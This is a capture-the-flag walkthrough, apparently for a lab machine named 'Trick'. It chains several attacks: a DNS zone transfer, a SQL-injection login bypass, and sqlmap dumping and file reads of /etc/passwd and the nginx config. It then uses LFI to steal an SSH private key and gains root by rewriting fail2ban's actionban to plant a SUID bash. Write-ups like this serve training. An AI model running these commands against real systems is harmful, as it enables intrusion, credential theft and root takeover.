![Logo](Images/Logo.png)

# Attack Chain

```
Enumeration → 22/SSH 25/SMTP 53/DNS 80/HTTP(nginx)
└─ reverse DNS lookup → trick.htb
   └─ DNS Zone Transfer trick.htb → preprod-payroll.trick.htb
      └─ login form → SQLi bypass
         └─ sqlmap → privileges FILE
            └─ --file-read /etc/passwd → user michael
               └─ --file-read nginx conf → preprod-marketing.trick.htb
                  └─ LFI ?page= → /home/michael/.ssh/id_rsa
                     └─ ssh michael → shell as michael (user.txt)
                        └─ group security + sudo NOPASSWD fail2ban restart
                           └─ write action.d → actionban = evilbash
                              └─ sudo fail2ban restart → daemon runs as root
                                 └─ SSH spam → actionban executed as root
                                    └─ /tmp/hacked -p → root privileges
```

# Sommaire

- [Enumeration](#enumeration)
	- [Nmap](#nmap)
	- [Website](#website)
	- [DNS](#dns)
- [preprod-payroll.trick.htb](#preprod-payrolltrickhtb)
	- [Bypass Login Form](#bypass-login-form)
	- [Sqlmap](#sqlmap)
	- [Sqlmap](#sqlmap)
	- [FILE Privilege](#file-privilege)
- [preprod-marketing.trick.htb](#preprod-marketingtrickhtb)
	- [Local File Inclusion](#local-file-inclusion)
	- [Michael's private SSH key](#michaels-private-ssh-key)
	- [Shell as michael](#shell-as-michael)
- [Privilege Escalation](#privilege-escalation)
	- [Basic Enumeration](#basic-enumeration)
	- [Exploit sudo right](#exploit-sudo-right)

---
# Enumeration

### Nmap

```
# Nmap 7.93 scan initiated Thu May 28 09:00:16 2026 as: nmap -sVC -oA nmap 10.129.*.*
Nmap scan report for 10.129.227.180
Host is up (0.067s latency).
Not shown: 996 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61ff293b36bd9dacfbde1f56884cae2d (RSA)
|   256 9ecdf2406196ea21a6ce2602af759a78 (ECDSA)
|_  256 7293f91158de34ad12b54b4a7364b970 (ED25519)
25/tcp open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 28 09:04:21 2026 -- 1 IP address (1 host up) scanned in 244.34 seconds
```

We got several open ports such as SSH, DNS, and HTTP.

### Website 

Let's head to the website first.

![Main Website](Images/Main%20Website.png)

![Main Website - Enter adress](Images/Main%20Website%20-%20Enter%20adress.png)

It looks like we are on a Website under development. Putting a mail inside the field doesn't do much. Let's see what we can find elsewhere.

### DNS

Since there is a website, maybe that the IP is associated to a DNS record which might give us clue to pursue our investigation.

Let's perform a reverse lookup dns with `dig`.

```
dig -x 10.129.*.* @10.129.*.*

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> -x 10.129.*.* @10.129.*.*
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42866
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 4e46deb5a3839f038900d1876a185d83ab8586326f2b920c (good)
;; QUESTION SECTION:
;*.*.129.10.in-addr.arpa.   IN      PTR

;; ANSWER SECTION:
*.*.129.10.in-addr.arpa. 604800 IN  PTR     trick.htb.

;; AUTHORITY SECTION:
*.129.10.in-addr.arpa. 604800 IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 31 msec
;; SERVER: 10.129.*.*#53(10.129.227.180) (UDP)
;; WHEN: Thu May 28 11:21:39 EDT 2026
;; MSG SIZE  rcvd: 165
```

The output reveals that the domain associated to the target is `trick.htb`.

We can now attempt to perform a DNS Zone Transfer to list every DNS records the target has.

```
dig axfr trick.htb  @"10.129.*.*"

; <<>> DiG 9.18.41-1~deb12u1-Debian <<>> axfr trick.htb @10.129.*.*
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 191 msec
;; SERVER: 10.129.*.*#53(10.129.227.180) (TCP)
;; WHEN: Thu May 28 11:17:25 EDT 2026
;; XFR size: 6 records (messages 1, bytes 231)
```

It worked, we have a list of vhost that we can check. `root.trick.htb` is the mail adress used by `trick.htb` and `preprod-payroll.trick.htb` should be a vhost to explore. Let's add it to our `/etc/hosts` file for resolution.

```
echo '10.129.*.* trick.htb preprod-payroll.trick.htb' | tee -a /etc/hosts
```

# preprod-payroll.trick.htb

`root.trick` redirect us to the main website we saw earlier so let's head to `preprod-payroll.trick.htb`.

A login form will be prompted to us but we do not have credentials for it. 
Trying several weak credentials such as `admin`:`admin`,  `admin`:`password` , etc... didn't work either.

### Bypass Login Form

Let's try a simple SQL Injection on the form to bypass it.

![SQLi Injection](Images/SQLi%20Injection.png)

![Admin Panel](Images/Admin%20Panel.png)

It worked ! We can now explore the application.
### Sqlmap 

Unfortunately for us, nothing much can be done. The forms are not vulnerable to SQL Injection or various Web attacks. But we know that we have SQLi on the login form, so let's send the request to `sqlmap` in order to retrieve useful data.

We first put the following inside a `.txt` file (captured with `Burpsuite`).

```
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
Content-Length: 35
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Origin: http://preprod-payroll.trick.htb
Referer: http://preprod-payroll.trick.htb/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=vnr5igovfnfe048okjjomh1pdo
Connection: keep-alive

username=%&password=a
```

Now we can send the request to `sqlmap` which will try to enumerate the database.

```
sqlmap -r request --batch --technique B
```

I specified the Boolean technique to speed up the process the process otherwise `sqlmap` will us Time-Based Injection which is extremely slow.

`sqlmap` will confirm the injection and we can dump a password with the following command.

```
sqlmap -r request --batch --dump -D payroll_db -T users
```

![Dump sql](Images/Dump%20sql.png)


But that password is only used to login as Administrator on the vhost and can't be used with SSH.

### FILE Privilege

We need to find another way. Let's list our privilege for the user running `sqlmap`.

```
sqlmap -r request --privileges                         

<SNIP>

[12:15:29] [INFO] fetching privileges for user 'remo'
[12:15:29] [INFO] retrieved: FILE
database management system users privileges:
[*] %remo% [1]:
    privilege: FILE
```

We have `FILE` right which allows us to read files on the target if we have the appropriate rights.

Let's retrieve `/etc/passwd` to see which users are available on the target.

```
sqlmap -r request --file-read "/etc/passwd" --level 5 --threads 10 --batch
```

```
cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
bind:x:120:128::/var/cache/bind:/usr/sbin/nologin
michael:x:1001:1001::/home/michael:/bin/bash
```

We discovered an user on the target, `michael`.

Let's look for his ssh key.

```
sqlmap -r request --file-read "/home/michael/.ssh/id_rsa" --level 5 --threads 10 --batch

<SNIP>

[12:53:11] [INFO] retrieving the length of query output
[12:53:11] [INFO] retrieved: 
[12:53:11] [INFO] retrieved:
```

We did not retrieved anything so either we can't access it, or it doesn't exist.

There is one more thing we can do with that privilege. We know that `nginx` is used to run the vhosts on the target from the nmap scan. 
It means that we can dump the configuration file used by `nginx` that list every vhosts present on the target.

```
sqlmap -r request --file-read "/etc/nginx/sites-enabled/default" --level 5 --threads 10 --batch
```

```
cat /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default                                                                                      
server {
        listen 80 default_server;
        listen [::]:80 default_server;
        server_name trick.htb;
        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}


server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}

```

We find another one `preprod-marketing.trick.htb`. We add it to our `/etc/hosts` file in order to access it.

# preprod-marketing.trick.htb

Browsing to the website reveals another website used for business.

![preprod-marketing.trick.htb](Images/preprod-marketing.trick.htb.png)

### Local File Inclusion

Clicking on **Service** tab or any other tab changes the URL and add a parameter to its which is `page`.

![preprod-marketing.trick.htb - service tab](Images/preprod-marketing.trick.htb%20-%20service%20tab.png)

We can try to see if the parameter is vulnerable to **Local File Inclusion**

![LFI - passwd](Images/LFI%20-%20passwd.png)

After some payloads, we were able to return `/etc/passwd`, confirming that the vhost is vulnerable to **LFI (Local File Inclusion)**.

### Michael's private SSH key

We can try to target once again the private ssh key of `michael` with different privileges.

![LFI - private key](Images/LFI%20-%20private%20key.png)
His ssh key has been retrieved. We can copy it from the source page so it has the correct format and can be used that way.

### Shell as michael

Let's copy the key to a file on our machine and give it proper permissions.

```
echo '<id_rsa>' > id_rsa
chmod 600 id_rsa
```

We can now attempt to connect over SSH as `michael`.

```
ssh -i id_rsa michael@10.129.*.*

michael@trick:~$
```

# Privilege Escalation

We finally got foothold on the target system. Let's look for privilege escalation now.

### Basic Enumeration

```
michael@trick:~$ id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

```
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

Our user is a member of the uncommon group `security` and can the following command as sudo.

```
sudo /etc/init.d/fail2ban restart
```

### Exploit sudo right

`failed2ban` can be exploited if we have write access on it's configuration file such as the action it will perform at start, or when banning an IP.

Let's check for writable folders/files.

```
michael@trick:/etc/fail2ban$ ls -la
total 76
drwxr-xr-x   6 root root      4096 May 29 09:24 .
drwxr-xr-x 126 root root     12288 May 29 09:11 ..
drwxrwx---   2 root security  4096 May 29 09:24 action.d
```

Our group has write access to `/etc/fail2ban/action.d`.
The folder contains the file `iptables-multiport.conf` which is used to define actions that `fail2ban` will do depending on the situation.

Let's copy the file to `/tmp`.

```
michael@trick:~$ cp /etc/fail2ban/action.d/iptables-multiport.conf /tmp/iptables-multiport.conf.bak
```

Now we must add an action that `fail2ban` will perform once it bans an IP.

I chose to copy `/bin/bash` to `/tmp` and add the SUID binary to it so i can have a privileged bash shell.
Let's add this line at `actionban = `

```
cp /bin/bash /tmp/hacked && chmod 4755 /tmp/hacked
```

Our file should look like this now.

```
# Fail2Ban configuration file
#
# Author: Cyril Jaquier
# Modified by Yaroslav Halchenko for multiport banning
#

[INCLUDES]

before = iptables-common.conf

[Definition]

# Option:  actionstart
# Notes.:  command executed once at the start of Fail2Ban.
# Values:  CMD
#
actionstart = <iptables> -N f2b-<name>
              <iptables> -A f2b-<name> -j <returntype>
              <iptables> -I <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>

# Option:  actionstop
# Notes.:  command executed once at the end of Fail2Ban
# Values:  CMD
#
actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

# Option:  actioncheck
# Notes.:  command executed once before each actionban command
# Values:  CMD
#
actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

# Option:  actionban
# Notes.:  command executed when banning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionban = cp /bin/bash /tmp/hacked && chmod 4755 /tmp/hacked

# Option:  actionunban
# Notes.:  command executed when unbanning an IP. Take care that the
#          command is executed with Fail2Ban user rights.
# Tags:    See jail.conf(5) man page
# Values:  CMD
#
actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```

For `fail2ban` to update it's configuration, we need to remove the existing one and copy our file to the folder.

```
michael@trick:~$ rm /etc/fail2ban/action.d/iptables-multiport.conf
rm: remove write-protected regular file '/etc/fail2ban/action.d/iptables-multiport.conf'? y
```

```
michael@trick:~$ cp /tmp/iptables-multiport.conf.bak /etc/fail2ban/action.d/iptables-multiport.conf
```

We can now restart the service and `fail2ban` should update it's configuration.

```
michael@trick:~$ sudo /etc/init.d/fail2ban restart
```

It's time to get our IP banned so the command we put in the conf file will be executed.

There is various techniques but the easiest one is to spam ssh connection from our machine and cancel it once we are prompted for the password. 

Example below :

```
ssh hacked@10.129.*.*

hacked@10.129.*.*'s password: 

CTRL^C

ssh hacked@10.129.*.*
hacked@10.129.*.*'s password: 

CTRL^C

ssh hacked@10.129.*.*

hacked@10.129.*.*'s password: 

CTRL^C
```

Let's check if our exploit worked.

```
michael@trick:/tmp$ ls -la
total 1208
drwxrwxrwt 14 root       root          4096 May 29 10:37 .
drwxr-xr-x 19 root       root          4096 May 25  2022 ..
drwxrwxrwt  2 root       root          4096 May 29 10:25 .font-unix
-rwsr-xr-x  1 root       root       1168776 May 29 10:38 hacked
```

We indeed got a privileged bash, and we can get root privileges by running :

```
/tmp/hacked -p

hacked-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root) groups=1001(michael),1002(security)
```

Machine rooted